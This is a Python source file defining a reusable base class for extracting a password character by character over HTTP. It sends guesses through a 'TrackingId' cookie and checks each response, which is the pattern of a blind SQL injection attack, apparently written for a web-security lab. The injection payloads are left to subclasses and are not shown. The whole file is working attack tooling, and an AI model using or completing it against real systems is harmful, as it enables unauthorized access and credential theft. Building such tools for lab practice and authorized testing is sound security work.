from abc import ABC, abstractmethod
from pwn import log
import string
import requests

class BasePasswordCracker(ABC):
    def __init__(self, url):
        self.url = url
        self.characteres = string.ascii_lowercase + string.digits
        self.password = ""
        self.progress_logger = log.progress("")

    def crack_password(self):
        try:
            while True:
                if self.is_password_found():
                    print("Password found!")
                    break

                found_character = self.try_next_character()
                if not found_character:
                    print("No more characters found. Exiting...")
                    break
        except KeyboardInterrupt:
            print("\nProcess interrupted. Exiting...")
        except Exception as e:
            print(f'Error: {e}')

    def try_next_character(self):
        for character in self.characteres:
            cookie = self.build_cookie_guess_password(character)
            response = self.make_request(cookie)
            self.progress_logger.status(f"Password cracker - The password is: {self.password + character}")
            if self.password_exists(response):
                self.password += character
                return True
        return False

    def make_request(self, cookie_value):
        cookies = {'TrackingId': cookie_value}
        return requests.get(self.url, cookies=cookies)

    def is_password_found(self):
        cookie = self.build_cookie_exact_match()
        response = self.make_request(cookie)
        return self.password_exists(response)

    @abstractmethod
    def build_cookie_exact_match(self): pass

    @abstractmethod
    def build_cookie_guess_password(self, character): pass

    @abstractmethod
    def password_exists(self, response): pass

